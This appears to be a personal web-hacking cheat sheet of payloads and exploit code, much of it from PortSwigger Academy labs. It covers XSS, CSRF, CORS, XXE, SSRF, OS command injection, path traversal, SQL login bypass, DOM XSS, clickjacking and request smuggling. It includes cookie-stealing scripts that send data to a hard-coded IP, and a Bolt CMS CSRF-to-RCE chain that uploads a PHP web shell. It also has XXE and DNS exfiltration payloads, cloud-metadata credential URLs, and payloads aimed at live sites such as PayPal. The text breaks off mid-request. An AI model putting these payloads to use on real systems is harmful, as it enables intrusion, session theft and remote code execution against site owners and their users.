Cheat Sheat


_________________________________________________________________________________________________________________
xss

＜img src=x onerror=alert(document.domain) />
<ｉmg src=x onerror=alert(document.domain) />
<ımg src=x onerror=alert(document.domain) />
<script>setTimeout(function(){location.replace = 'http://45.63.42.245:4422/?secret=+document.cookie";} , 5000);   </script>
%3Csvg/onload=alert(document.domain)%3E
 <svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>

<iframe src=javascript:alert(1)>

data:text/html,<img src=1 onerror=alert(1)> 
<script>setTimeout(function(){
location.replace('http://45.63.42.245:4422/?secret='+document.cookie)} , 5000);
</script>
<a href="#" onclick="prompt`1`">a</a>
'><img src=/x/ onerror=alert(1);>
" onmouseover="alert(1)">
"><img src=/x/ onerror=alert(1);>

"'},alert(1);//

{onerror=eval}throw{lineNumber:1,columnNumber:1,fileName:1,message:'alert\x281\x29'}

onbegin=alert;throw 23;

onend=alert;throw '\x281\x29';

onbegin=alert;throw '\x281\x29';

<><img src=1 onerror=alert(1)>
<script>throw onerror=eval,'=alert\x281\x29'</script>

throw onbegin=eval,'=alert\x281\x29'

throw onerror = alert, 'some string', 123, 'haha'


javascript:window.onbegin=alert;throw%201

var v = javascript:

var d = v.window.onbegin=alert;throw%201;


throw/a/,Uncaught=1,g=alert,a=URL+0,onerror=eval,/1/g+a[12]+1337+a[13]

throw/a/,Uncaught=1,g=alert,a=URL+0,onerror=eval,/1/g+a[12]+1337+a[13]

throw; onbegin=alert

#######################################################################################################################################
jsonp callback
#######################################################################################################################################
<script>
function rip(a) {

alert(JSON.stringify(a[1]));

}
</script>
<script src="https://site?callback=rip"></script>




<html>
 <head>
 <script>
 test = function(data) {
 alert(" Username " + data.data.username + " metadata " + data.data.email);
 }
 </script>
 </head>
 <body>
 <h1>Executed poc</h1>
 <script src="https://sso2.site.com/sso2/user/profile?callback=test"></script>
 </body>
 </html>
 
 
 
 
 
 
 
 
 <script type="text/javascript">		
  function userlnfo(data){		
   document.write(		
    "ID: "+data .accounts[0].id+		
    "<br>Name :  "+data.accounts[0].name+		
    "<br>Email: "+data.accounts[0].email		
);		
 }		
</script>	
<script src="http://locahost/info.json"></script>



#######################################################################################################################################

csrf
#######################################################################################################################################

muilti request using ajax csrf example

	<html>
	  <body>   
	  <head>
	Bolt v 3.x exploit 
	</head>
	<h1>Bolt v 3.x csrf -> xss -> rce exploit</h1>
	<img src ="https://66.media.tumblr.com/8c1e5f1a62191b9091fd8736f8c4810b/tumblr_pf6q303FlE1vgbzx6o1_r1_400.jpg">         
	<script>
	      function submitRequest()
	      {
	        Csrf = async () => {
	        const xhr = new XMLHttpRequest();
	        xhr.open("POST", "http:\/\/127.0.0.1\/index.php\/async\/folder\/create", true);
	        xhr.setRequestHeader("Accept", "*\/*");
	        xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
	        xhr.setRequestHeader("Content-Type", "application\/x-www-form-urlencoded; charset=UTF-8");
	        xhr.withCredentials = true;
	        var body = "parent=&foldername=sss&namespace=files";
	        var aBody = new Uint8Array(body.length);
	        for (var i = 0; i < aBody.length; i++)
	          aBody[i] = body.charCodeAt(i);
	          xhr.send(new Blob([aBody]));
	        xhr.onreadystatechange = async (e) => {
	        if (xhr.readyState === 4 && xhr.status === 200){

	};
	 JSfuck1(); 
	}

	}
	      JSfuck1 = async () => {
	const xhr = new XMLHttpRequest();
	xhr.open("POST", "http:\/\/127.0.0.1\/index.php\/async\/file\/create", true);
	xhr.setRequestHeader("Accept", "*\/*");
	xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
	xhr.setRequestHeader("Content-Type", "application\/x-www-form-urlencoded; charset=UTF-8");
	xhr.withCredentials = true;
	var body1 = "filename=aaa&parentPath=sss&namespace=files";
	xhr.send(body1);
	xhr.onreadystatechange = async (e) => {
	if (xhr.readyState === 4 && xhr.status === 200){

	}


	};
	where(); 
	      }

	      where = async () => {
	const xhr = new XMLHttpRequest();
	xhr.open("POST", "http:\/\/127.0.0.1\/index.php\/async\/file\/rename", true);
	xhr.setRequestHeader("Accept", "*\/*");
	xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
	xhr.setRequestHeader("Content-Type", "application\/x-www-form-urlencoded; charset=UTF-8");
	xhr.withCredentials = true;
	var body2 = "namespace=files&parent=sss&oldname=aaa&newname=aaa%3Cscript+src%3D'http%3A%26%23x2f%3B%26%23x2f%3B45.63.42.245%26%23x2f%3Bfinal.js'%3C%26%23x2f%3Bscript%3E.jpg";
	xhr.send(body2);

	}
	          Csrf();
	      }
	</script>
	    <form action="#">
	      <input type="button" value="Submit request" onclick="submitRequest();" />
	    </form>
	  </body>
	</html>

	JS p0c

	<script>
	Token = async () => {
	var xhr = new XMLHttpRequest();
	xhr.open("GET", "\/index.php\/bolt\/files", true);
	xhr.responseType = "document";
	xhr.withCredentials=true;
	xhr.onreadystatechange = async (e) => {
	if (xhr.readyState === 4 && xhr.status === 200){
	doc = xhr.response;
	token = doc.getElementsByName("file_upload[_token]")[0].value;
	upload(token);
	console.log(token);

	}
	};
	xhr.send();
	}



	upload = async (csrfToken) =>{
	var body = "-----------------------------190530466613268610451083392867\r\n" + 
	         "Content-Disposition: form-data; name=\"file_upload[select][]\"; filename=\"r3m0t3nu11.txt\"\r\n" + 
	          "Content-Type: text/plain\r\n" + 
	          "\r\n" + 
	          "<?php system($_GET['test']);?>\r\n" + 
	          "-----------------------------190530466613268610451083392867\r\n" + 
	          "Content-Disposition: form-data; name=\"file_upload[upload]\"\r\n" + 
	          "\r\n" + 
	          "\r\n" + 
	          "-----------------------------190530466613268610451083392867\r\n" + 
	          "Content-Disposition: form-data; name=\"file_upload[_token]\"\r\n" + 
	          "\r\n" + 
	          token
	          "-----------------------------190530466613268610451083392867--\r\n";

	const xhr = new XMLHttpRequest();
	xhr.open("POST", "http:\/\/127.0.0.1\/index.php\/bolt\/files", true);
	xhr.setRequestHeader("Accept", "text\/html,application\/xhtml+xml,application\/xml;q=0.9,*\/*;q=0.8");
	xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
	xhr.setRequestHeader("Content-Type", "multipart\/form-data; boundary=---------------------------190530466613268610451083392867");
	xhr.withCredentials = true;
	 xhr.onreadystatechange = async (e) => {
	if (xhr.readyState === 4 && xhr.status === 200){ 
	  Shell();
	}

	};
	     
	 var aBody = new Uint8Array(body.length);
	        for (var i = 0; i < aBody.length; i++)
	          aBody[i] = body.charCodeAt(i); 
	        xhr.send(new Blob([aBody])); 
	          
	}


	Shell = async () => {
	const xhr = new XMLHttpRequest();
	xhr.open("POST", "http:\/\/127.0.0.1/index.php/async/file/rename", true);
	xhr.setRequestHeader("Accept", "*\/*");
	xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
	xhr.setRequestHeader("Content-Type", "application\/x-www-form-urlencoded; charset=UTF-8");
	xhr.withCredentials = true;
	xhr.timeout = 4000;
	var body1 = "namespace=files&parent=&oldname=r3m0t3nu11.txt&newname=dd%2Fphp-exif-systemasjpg%2Faa%2Fphp-exif-system.php%2Faaa.jpg";
	xhr.send(body1);
	bypass();
	}

	bypass = async () => {
	const xhr = new XMLHttpRequest();
	xhr.open("POST", "http:\/\/127.0.0.1/index.php/async/folder/rename", true);
	xhr.setRequestHeader("Accept", "*\/*");
	xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
	xhr.setRequestHeader("Content-Type", "application\/x-www-form-urlencoded; charset=UTF-8");
	xhr.withCredentials = true;
	xhr.timeout = 4000;
	var body1 = "namespace=files&parent=dd%2Fphp-exif-systemasjpg%2Faa/php-exif-system.php%2f&oldname=aaa.jpg&newname=bypass.php";
	xhr.send(body1);
	bypass2();
	}

	bypass2 = async () => {
	const xhr = new XMLHttpRequest();
	xhr.open("POST", "http:\/\/127.0.0.1/index.php/async/folder/rename", true);
	xhr.setRequestHeader("Accept", "*\/*");
	xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
	xhr.setRequestHeader("Content-Type", "application\/x-www-form-urlencoded; charset=UTF-8");
	xhr.withCredentials = true;
	xhr.timeout = 4000;
	var body1 = "namespace=files&parent=dd%2Fphp-exif-systemasjpg%2Faa/&oldname=php-exif-system.php&newname=bypass1";
	xhr.send(body1);

	}



	Token();
	</script>

csrf bypass csrf-token with vaild token
<form method="POST" action="https://acab1f011f4570ee80b53494001e0051.web-security-academy.net/email/change-email">
     <input type="hidden" name="email" value="aa@aa.net">
     <input type="hidden" name="csrf" value="y9jebx1naHRQg6w1iabaA0GlaAHiQfW8">
</form>
<script>
      document.forms[0].submit();
</script> 





csrf bypass with crlf
<form method="POST" action="https://ac461f981f98fc4a8031346700840056.web-security-academy.net/email/change-email">
     <input type="hidden" name="email" value="aa@aa.net">
     <input type="hidden" name="csrf" value="wlYqsghBgyYstJesHVk8LcbggK6ILGkB">
</form>
  <img src="https://ac461f981f98fc4a8031346700840056.web-security-academy.net/?search=aa%0d%0aSet-Cookie:%20csrfKey=6EiZ9bhv4pHNHMRdeqNiQeEB2gq03oZR" onerror="document.forms[0].submit()"> 



clrf2
<form method="POST" action="https://ac171fc71e311761817c1d810048009d.web-security-academy.net/email/change-email">
     <input type="hidden" name="email" value="aa@aa.net">
     <input type="hidden" name="csrf" value="ZBp3U21JWYVvtUW5sPUaoZFM6Iejg6bh">
</form>
  <img src="https://ac171fc71e311761817c1d810048009d.web-security-academy.net/?search=aa%0d%0aSet-Cookie:%20csrf=ZBp3U21JWYVvtUW5sPUaoZFM6Iejg6bh" onerror="document.forms[0].submit()"> 




refere check
<meta name="referrer" content="no-referrer"> 
<form method="POST" action="https://ac8c1f491f326754817d1c0400fa00e8.web-security-academy.net/email/change-email">
     <input type="hidden" name="email" value="aa@aa.net">
</form>
<script>
      document.forms[0].submit();
</script> 


broken refere
<form method="POST" action="https://ac611f501e4af2d98087390600e6005a.web-security-academy.net/email/change-email">
     <input type="hidden" name="email" value="aa@aa.net">
</form>
<script>
  history.pushState("", "", "/?$ac611f501e4af2d98087390600e6005a.web-security-academy.net") 
      document.forms[0].submit();
</script> 


#######################################################################################################################################


cros 

#######################################################################################################################################

<html>
     <body>
         <h2>CORS PoC</h2>
         <div id="demo">
             <button type="button" onclick="cors()">Exploit</button>
         </div>
         <script>
             function cors() {
             var xhr = new XMLHttpRequest();
             xhr.onreadystatechange = function() {
                 if (this.readyState == 4 && this.status == 200) {
                 document.getElementById("demo").innerHTML = alert(this.responseText);
                 }
             };
              xhr.open("GET",
                       "https://acab1f581ef34fda80c39e99008f0063.web-security-academy.net/accountDetails", true);
             xhr.withCredentials = true;
             xhr.send(null);
             }
         </script>
     </body>
 </html>



normal

 <script>
   var req = new XMLHttpRequest();
   req.onload = reqListener;
   req.open('get','https://acc91f981fc0709180ab41e2001000fc.web-security-academy.net/accountDetails',true);
   req.withCredentials = true;
   req.send();

   function reqListener() {
       location='/log?key='+this.responseText;
   };
</script>



null cross---

<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html, <script>
   var req = new XMLHttpRequest ();
   req.onload = reqListener;
   req.open('get','https://acab1f581ef34fda80c39e99008f0063.web-security-academy.net/accountDetails',true);
   req.withCredentials = true;
   req.send();

   function reqListener() {
       location='https://acab1f581ef34fda80c39e99008f0063.web-security-academy.net/log?key='+encodeURIComponent(this.responseText);
   };
</script>"></iframe> 



xss bypass cross 
----------

 <script>
   document.location="http://stock.ace61f9b1f2b334c80621036000d0029.web-security-academy.net/?productId=2<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://ace61f9b1f2b334c80621036000d0029.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://ac4e1f301f3533f680d1109a011a0042.web-security-academy.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
</script> 


################################################################################################################
xxe
################################################################################################################

Exploiting XXE using external entities to retrieve files

<?xml version="1.0" encoding="ISO-8859-1"?>
  <!DOCTYPE foo [  
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>

XXE inside a SOAP node: 
<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://0x0:22/"> %dtd;]><xxx/>]]></foo></soap:Body>

Exploiting XInclude to retrieve files

<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]><stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>


XInclude 

productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1


Exploiting XXE via image file upload


<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
   <text font-size="16" x="0" y="16">&xxe;</text>
</svg>


Blind XXE with out-of-band interaction

<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://vlkjpz9vg38urof0o1dfm0spsgy6mv.burpcollaborator.net"> ]> <stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>

Blind XXE with out-of-band interaction

<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://vlkjpz9vg38urof0o1dfm0spsgy6mv.burpcollaborator.net"> %xxe; ]> <stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>


Blind XXE with out-of-band interaction via XML parameter entities


<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://9fpymcyhqzy0w0uqdmuf289di4oycn.burpcollaborator.net"> %xxe; ]>


Exploiting blind XXE to exfiltrate data using a malicious external DTD


injection

<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://134.209.183.253:8081/n.dtd"> %xxe;]> 

dtd 

<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://kk80buz7gs48qu4r8qm4ne9yopufi4.burpcollaborator.net/?x=%file;'>">
%eval;
%exfil; 


Exploiting blind XXE to retrieve data via error messages

injection
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://ac081ff21f2fcb23803e24b3010000c0.web-security-academy.net/exploit"> %xxe;]> 

dtd

<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
%eval;
%exfil; 


Exploiting XXE to retrieve data by repurposing a local DTD

exploit

<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE message [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]> <stockCheck><productId>3</productId><storeId>1</storeId></stockCheck>

#######################################################################################################################################
access control

header 

[X-Original-URL: /admin/delete]


GET /?username=carlos HTTP/1.1
Host: acd11fff1fd7902180686c2a00f90080.web-security-academy.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:75.0) Gecko/20100101 Firefox/75.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Original-URL: /admin/delete
Referer: https://acd11fff1fd7902180686c2a00f90080.web-security-academy.net/
Connection: close
Cookie: session=czZIrdsmfMXu2K6vYzo9a9YcrJDZXbP9
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0


2- Method-based access control can be circumvented

 POSTX /admin-roles HTTP/1.1
Host: ac411fe21ee44f1980f1b64900740064.web-security-academy.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:75.0) Gecko/20100101 Firefox/75.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: session=TbvvwC9wyJQojeLGJqoBKdoU5yMCzQnG
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

username=carlos&action=upgrade



GET /admin-roles?username=wiener&action=upgrade HTTP/1.1
Host: ac411fe21ee44f1980f1b64900740064.web-security-academy.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:75.0) Gecko/20100101 Firefox/75.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: session=TbvvwC9wyJQojeLGJqoBKdoU5yMCzQnG
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0

#######################################################################################################################################

ssrf 
#######################################################################################################################################
http://127.0.0.1:80
http://127.0.0.1:443
http://127.0.0.1:22
http://0.0.0.0:80
http://0.0.0.0:443
http://0.0.0.0:22
http://localhost:80
http://localhost:443
http://localhost:22
https://127.0.0.1/
https://localhost/
http://[::]:80/
http://[::]:25/
http://[::]:22/
http://[::]:3128/ 
http://0000::1:80/
http://0000::1:25/
http://0000::1:22/
http://0000::1:3128/ 
http://spoofed.burpcollaborator.net
http://localtest.me
http://customer1.app.localhost.my.company.127.0.0.1.nip.io
http://mail.ebc.apple.com
http://bugbounty.dod.network 
http://127.127.127.127
http://127.0.1.3
http://127.0.0.0
http://0177.0.0.1/
http://2130706433/
http://3232235521/
http://3232235777/
http://[0:0:0:0:0:ffff:127.0.0.1]
localhost:+11211aaa
localhost:00011211aaaa
http://0/
http://127.1
http://127.0.1
http://1.1.1.1 &@2.2.2.2# @3.3.3.3/
0://evil.com:80;http://google.com:80/ 
http://127.1.1.1:80\@127.2.2.2:80/
http://127.1.1.1:80\@@127.2.2.2:80/
http://127.1.1.1:80:\@@127.2.2.2:80/
http://127.1.1.1:80#\@127.2.2.2:80/
file:///etc/passwd
file://\/\/etc/passwd
sftp://1:11111/
gopher://127.0.0.1:4242/DATA
http://169.254.169.254
http://169.254.169.254
http://metadata.nicob.net/
http://169.254.169.254.xip.io/
http://1ynrnhl.xip.io/
http://www.owasp.org.1ynrnhl.xip.io/
http://425.510.425.510/ 
http://2852039166/ 
http://7147006462/ 
http://0xA9.0xFE.0xA9.0xFE/ 
http://0xA9FEA9FE/
http://0x41414141A9FEA9FE/
http://0251.0376.0251.0376/ 
http://0251.00376.000251.0000376/
http://169.254.169.254/latest/user-data
http://169.254.169.254/latest/user-data/iam/security-credentials/[ROLE NAME]
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]
http://169.254.169.254/latest/meta-data/iam/security-credentials/PhotonInstance
http://169.254.169.254/latest/meta-data/ami-id
http://169.254.169.254/latest/meta-data/reservation-id
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/public-keys/
http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key
http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy
http://169.254.169.254/latest/meta-data/iam/security-credentials/s3access
http://169.254.169.254/latest/dynamic/instance-identity/document
http://169.254.169.254/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/
http://metadata/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/hostname
http://metadata.google.internal/computeMetadata/v1/instance/id
http://metadata.google.internal/computeMetadata/v1/project/project-id
http://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true
http://metadata.google.internal/computeMetadata/v1beta1/
http://metadata.google.internal/computeMetadata/v1beta1/?recursive=true
http://169.254.169.254/metadata/v1.json
http://169.254.169.254/metadata/v1/ 
http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1/user-data
http://169.254.169.254/metadata/v1/hostname
http://169.254.169.254/metadata/v1/region
http://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/address
http://169.254.169.254/metadata/v1/maintenance
http://169.254.169.254/metadata/instance?api-version=2017-04-02
http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&format=text
http://169.254.169.254/openstack
http://169.254.169.254/2009-04-04/meta-data/ 
http://192.0.0.192/latest/
http://192.0.0.192/latest/user-data/
http://192.0.0.192/latest/meta-data/
http://192.0.0.192/latest/attributes/
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/instance-id
http://100.100.100.200/latest/meta-data/image-id
http://127.0.0.1:2375/v1.24/containers/json





SSRF with blacklist-based input filter

http%3a%2f%2f127%2e0%2e1/admiN/delete?username=carlos

or %2561dmin

SSRF with whitelist-based input filter

http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos


SSRF with filter bypass via open redirection vulnerability

stockApi=/product/nextProduct?currentProductId=5&path=http://192.168.0.12:8080/admin

#######################################################################################################################################
os injection
#######################################################################################################################################
Blind OS command injection with output redirection
l0v3rs14%40gmail.net||id>/var/www/images/a.txt||

Blind OS command injection with out-of-band interaction
x||nslookup+x.burpcollaborator.net||

 Blind OS command injection with out-of-band data exfiltration

  email=test@aaa.net||nslookup+`whoami`.in97b7vivx3e5q9rrwctxa9xfole93.burpcollaborator.net||

#######################################################################################################################################
  path traversal
  #######################################################################################################################################
  
  ../
..\
..\/
%2e%2e%2f
%252e%252e%252f
%c0%ae%c0%ae%c0%af
%uff0e%uff0e%u2215
%uff0e%uff0e%u2216

16 bits Unicode encoding

. = %u002e
/ = %u2215
\ = %u2216


UTF-8 Unicode encoding

. = %c0%2e, %e0%40%ae, %c0ae
/ = %c0%af, %e0%80%af, %c0%2f
\ = %c0%5c, %c0%80%5c


Bypass "../" replaced by ""

Sometimes you encounter a WAF which remove the "../" characters from the strings, just duplicate them.

..././
...\.\


Bypass "../" with ";"

..;/
http://domain.tld/page.jsp?include=..;/..;/sensitive.txt 

Double URL encoding

. = %252e
/ = %252f
\ = %255c

  ....//....//....//etc/passwd

  ..%252f..%252f..%252fetc/passwd

  /var/www/../../../etc/passwd

  ../../../etc/passwd%00.png

#######################################################################################################################################


no/+sqli bypass login 
#######################################################################################################################################
' or 1=1 -- -
' or 1=1 # > post
' || 0x1 %00
" or 1=1 -- -
" or 1=1 # > post
" || 0x1#@gmail.com %00
%27%20%7c%7c%20%30%78%31%23@gmail.com
%22%20%7c%7c%20%30%78%31%23@gmail.com
":{"name":"r3m0t3n","type":"researcher","avatar":null,"status":"pending","email":"aaa@gmail.com"

-------------------------------------------------------

x<script> function poc(){ window.win=window.open('https://www.combell.com/nl/hosting/webhosting'); var msg= "<img src=a onerror='alert(1)'/>"; setTimeout(function(){win.postMessage(msg,'*');}, 5000); } </script> <a href="#" onclick="poc();">PoC</a>

<html>
<body>
  <iframe id="iframe" src="https://www.combell.com/nl/hosting/webhosting"></iframe>
<script>
 setTimeout(function() {
 var msg= "<img src=a onerror='alert(1)'/>";
 document.createElement("iframe").postMessage(msg,'*');
 },  2000);
</script>
</body>
</html>

DOM XSS using web messages

<script> function poc(){ window.win=window.open('https://www.paypal.com/cgi-bin/webscr?cmd=_flow&SESSION=Jjr7SOcSFWJ3KxJ5jEWZlSD3JO_lMIvOWjsn2llCaF8b4x3Eat44w_7CX_0&dispatch=50a222a57771920b6a3d7b606239e4d529b525e0b7e69bf0224adecfb0124e9b61f737ba21b0819863eeac493bb9aa4bf57acefcf1040024&rapidsState=OneX__ExpressCheckoutOneXFlow___StateFatalError&rapidsStateSignature=73d7bcfafc8f40e632b7627ea47825e76ad3cbdc'); var msg='test'; setTimeout(function(){win.postMessage(msg,'*');}, 5000); } </script> <a href="#" onclick="poc();">PoC</a>





<iframe src="https://ac551f501fdeb1ac80a257c9008e002a.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=alert(document.cookie)>','*')">


 example vln

 <script>
                            window.addEventListener('message', function(e) {
                                var url = e.data;
                                if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
                                    location.href = url;
                                }
                            }, false);
                        </script>



slo

<iframe src="https://www.paypal.com/cgi-bin/webscr?cmd=_flow&SESSION=Jjr7SOcSFWJ3KxJ5jEWZlSD3JO_lMIvOWjsn2llCaF8b4x3Eat44w_7CX_0&dispatch=50a222a57771920b6a3d7b606239e4d529b525e0b7e69bf0224adecfb0124e9b61f737ba21b0819863eeac493bb9aa4bf57acefcf1040024&rapidsState=OneX__ExpressCheckoutOneXFlow___StateFatalError&rapidsStateSignature=73d7bcfafc8f40e632b7627ea47825e76ad3cbdc" onload="this.contentWindow.postMessage('javascript:alert(document.cookie)//http:','*')">


example 2

This event listener expects a string that is parsed using JSON.parse. In the JavaScript, we can see that the event listener expects a type property and that the load-channel case of the switch statement changes the iframe src attribute. 



            window.addEventListener('message', function(e) {
                                var iframe = document.createElement('iframe'), ACMEplayer = {element: iframe}, d;
                                document.body.appendChild(iframe);
                                try {
                                    d = JSON.parse(e.data);
                                } catch(e) {
                                    return;
                                }
                                switch(d.type) {
                                    case "page-load":
                                        ACMEplayer.element.scrollIntoView();
                                        break;
                                    case "load-channel":
                                        ACMEplayer.element.src = d.url;
                                        break;
                                    case "player-height-changed":
                                        ACMEplayer.element.style.width = d.width + "px";
                                        ACMEplayer.element.style.height = d.height + "px";
                                        break;
                                }
                            }, false);


slove

 When the iframe we constructed loads, the postMessage() method sends a web message to the home page with the type load-channel. The event listener receives the message and parses it using JSON.parse before sending it to the switch.

The switch triggers the load-channel case, which assigns the url property of the message to the src attribute of the ACMEplayer.element iframe. However, in this case, the url property of the message actually contains our JavaScript payload.

As the second argument specifies that any targetOrigin is allowed for the web message, and the event handler does not contain any form of origin check, the payload is set as the src of the ACMEplayer.element iframe. The alert() function is called when the victim loads the page in their browser. 

<iframe src=https://ac461f481ee86a21807c34e000390004.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:alert(document.cookie)\"}","*")'> 



example 3

                        <script>
                            document.cookie = 'lastViewedProduct=' + window.location
                        </script>
    Notice that the home page uses a client-side cookie called lastViewedProduct, whose value is the URL of the last product page that the user visited.


    exploit

      <iframe src="https://acb61f031ed22890806f573700760058.web-security-academy.net/product?productId=1&'><script>alert(document.cookie)</script>" onload="if(!window.x)this.src='https://acb61f031ed22890806f573700760058.web-security-academy.net';window.x=1;">

The original source of the iframe matches the URL of one of the product pages, except there is a JavaScript payload added to the end. When the iframe loads for the first time, the browser temporarily opens the malicious URL, which is then saved as the value of the lastViewedProduct cookie. The onload event handler ensures that the victim is then immediately redirected to the home page, unaware that this manipulation ever took place. While the victim's browser has the poisoned cookie saved, loading the home page will cause the payload to execute.



Lab: Clobbering DOM attributes to bypass HTML filters

<form id=x tabindex=0 onfocus=alert(document.cookie)><input id=attributes>

call it

<iframe src=https://ac001f8c1eff779f804c993b00400081.web-security-academy.net/post?postId=5 onload="setTimeout(someArgument=>this.src=this.src+'#x',500)">

Exploiting DOM clobbering to enable XSS

let defaultAvatar = window.defaultAvatar || {avatar: '/resources/images/avatarDefault.svg'}
 The defaultAvatar object is implemented using this dangerous pattern containing the logical OR operator in conjunction with a global variable. This makes it vulnerable to DOM clobbering.

You can clobber this object using anchor tags. Creating two anchors with the same ID causes them to be grouped in a DOM collection. The name attribute in the second anchor contains the value "avatar", which will clobber the avatar property with the contents of the href attribute.

Notice that the site uses the DOMPurify filter in an attempt to reduce DOM-based vulnerabilities. However, DOMPurify allows you to use the cid: protocol, which does not URL-encode double-quotes. This means you can inject an encoded double-quote that will be decoded at runtime. As a result, the injection described above will cause the defaultAvatar variable to be assigned the clobbered property {avatar: ‘cid:"onerror=alert(1)//’} the next time the page is loaded.

When you make a second post, the browser uses the newly-clobbered global variable, which smuggles the payload in the onerror event handler and triggers the alert(). 

<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//"> 

-------------------------------------------------------
Basic clickjacking with CSRF token protection


<style>
   iframe {
       position:relative;
       width: $500px;
       height: $700px;
       opacity: $0.0001;
       z-index: 2;
   }
   div {
       position:absolute;
       top: $300px;
       left: $60px;
       z-index: 1;
   }
</style>
<div>Test me</div>
<iframe src="https://ace21f7a1e16e9fe803976a3003b002a.web-security-academy.net/account"></iframe>

HTTP request smuggling, basic CL.TE vulnerability

POST / HTTP/1.1
Host: acc01f421e1963c6803322fd00370097.web-security-academy.net
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 10
Transfer-Encoding: chunked

0

G

response

HTTP/1.1 403 Forbidden
Content-Type: application/json; charset=utf-8
Connection: close
Keep-Alive: timeout=0
Content-Length: 27

"Unrecognized method GPOST"


HTTP request smuggling, basic TE.CL vulnerability



POST / HTTP/1.1
Host: host
Content-Type: application/x-www-form-urlencoded
Content-length: 4 << important
Transfer-Encoding: chunked

5c =================================================
GPOST / HTTP/1.1                                   ||
Content-Type: application/x-www-form-urlencoded    ||
Content-Length: 15                                 ||
                                                   ||
x=1                                                ||
0                                                  ||
                                               \r\n||
                                                   ||
                                                   ||
 HTTP request smuggling, obfuscating the TE header ||
                                                   ||
[c] is the length of "GPOST / HTTP/1.1  <==========
 Content-Type: application/x-www-form-urlencoded Content-Length: 15 x=1 0" in hex. If you calculate it in dec you get a 92. :-) 



exploit

POST / HTTP/1.1
Host: acaxx.net
